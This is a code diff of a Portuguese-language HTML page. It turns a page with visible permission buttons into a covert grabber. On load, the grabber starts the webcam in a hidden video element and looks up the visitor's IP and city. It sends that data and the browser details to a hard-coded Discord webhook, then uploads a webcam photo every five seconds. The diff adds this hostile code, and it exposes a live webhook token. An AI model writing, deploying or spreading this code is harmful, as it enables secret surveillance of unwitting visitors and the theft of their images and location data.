@@ -3,111 +3,121 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Informações do Usuário</title>
+    <title>Coletar Dados do Usuário</title>
     <style>
         body {
-            background-color: black;
+            background-color: black;  /* fundo preto */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
             color: white;
-            font-family: Arial, sans-serif;
         }
-        button {
-            background-color: #4CAF50;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #45a049;
-        }
-        .content {
-            text-align: center;
-            margin-top: 50px;
+        video {
+            display: none;  /* ocultar o vídeo, pois só vamos capturar a imagem */
         }
     </style>
 </head>
 <body>
-    <div class="content">
-        <h1>Capturar Informações do Usuário</h1>
-        <button id="getPermission">Permitir Acesso à Câmera</button>
-        <button id="sendInfo">Enviar Informações</button>
-        <p id="status"></p>
-    </div>
+    <video id="videoElement" autoplay></video>  <!-- vídeo oculto que usa a câmera -->
 
     <script>
-        let userInfo = {};
-
-        // Função para pegar informações do usuário
-        function getUserInfo() {
-            const ip = '192.168.0.1'; // Use API de IP para capturar o IP real
-            const deviceInfo = navigator.userAgent;
-            const browser = navigator.appName;
-            
-            userInfo = { ip, deviceInfo, browser };
+        // Função para pegar informações do dispositivo
+        function getDeviceInfo() {
+            const deviceInfo = navigator.userAgent;  // Informações do dispositivo (navegador)
+            const browser = navigator.appName;  // Nome do navegador
+            return { deviceInfo, browser };
         }
 
-        // Permissão para câmera
-        document.getElementById('getPermission').addEventListener('click', function() {
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    document.getElementById('status').innerText = "Permissão Concedida. Capturando fotos...";
-                    capturePhoto(stream);
-                })
-                .catch(function(err) {
-                    document.getElementById('status').innerText = "Permissão Negada!";
-                });
-        });
+        // Função para enviar as informações para o Discord Webhook
+        function sendToDiscord(info) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3';
 
-        // Captura a foto a cada 5 segundos
-        function capturePhoto(stream) {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.play();
-
-            setInterval(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 640;
-                canvas.height = 480;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                canvas.toBlob(blob => {
-                    sendPhotoToWebhook(blob);
-                }, 'image/jpeg');
-            }, 5000);
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: `**Informações do Usuário:**
+IP: ${info.ip}
+Dispositivo: ${info.deviceInfo}
+Navegador: ${info.browser}
+Região: ${info.region}
+`})
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Dados enviados com sucesso!');
+                } else {
+                    console.error('Erro ao enviar dados');
+                }
+            })
+            .catch(error => console.error('Erro ao enviar dados:', error));
         }
 
-        // Envia a foto para o webhook
-        function sendPhotoToWebhook(blob) {
+        // Função para capturar a foto a cada 5 segundos e enviar ao Discord
+        function capturePhoto(videoElement) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;  // Defina o tamanho do canvas para capturar a imagem
+            canvas.height = 480;
+            const context = canvas.getContext('2d');
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                sendPhotoToDiscord(blob);  // Enviar foto para o Discord Webhook
+            }, 'image/jpeg');
+        }
+
+        // Função para enviar a foto para o Discord Webhook
+        function sendPhotoToDiscord(blob) {
             const formData = new FormData();
             formData.append('file', blob);
 
             fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_URL', {
                 method: 'POST',
                 body: formData
-            }).then(response => response.json())
-              .then(data => console.log('Imagem enviada para o webhook:', data))
-              .catch(error => console.error('Erro ao enviar imagem:', error));
-        }
-
-        // Envia as informações coletadas para o backend
-        document.getElementById('sendInfo').addEventListener('click', function() {
-            getUserInfo();
-
-            fetch('/send-info', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(userInfo)
             })
             .then(response => response.json())
-            .then(data => {
-                document.getElementById('status').innerText = "Informações enviadas com sucesso!";
-            })
-            .catch(error => {
-                document.getElementById('status').innerText = "Erro ao enviar informações.";
-                console.error('Erro:', error);
-            });
-        });
+            .then(data => console.log('Foto enviada para o webhook:', data))
+            .catch(error => console.error('Erro ao enviar foto:', error));
+        }
+
+        // Função para acessar a câmera do usuário e começar o processo
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    const videoElement = document.getElementById('videoElement');
+                    videoElement.srcObject = stream;
+
+                    // Obter informações do dispositivo
+                    const deviceInfo = getDeviceInfo();
+
+                    // Enviar as informações do dispositivo e localização do IP
+                    fetch('https://ip-api.com/json')
+                        .then(response => response.json())
+                        .then(data => {
+                            // Incluindo IP e região no envio ao Discord
+                            const userInfo = {
+                                ip: data.query,
+                                deviceInfo: deviceInfo.deviceInfo,
+                                browser: deviceInfo.browser,
+                                region: data.city + ', ' + data.country
+                            };
+
+                            sendToDiscord(userInfo);  // Enviar as informações ao Discord
+
+                            // Captura foto a cada 5 segundos
+                            setInterval(() => capturePhoto(videoElement), 5000);
+                        });
+                })
+                .catch(function (error) {
+                    console.error('Erro ao acessar a câmera:', error);
+                });
+        }
+
+        // Iniciar câmera automaticamente ao carregar a página
+        window.onload = startCamera;
     </script>
 </body>
 </html>
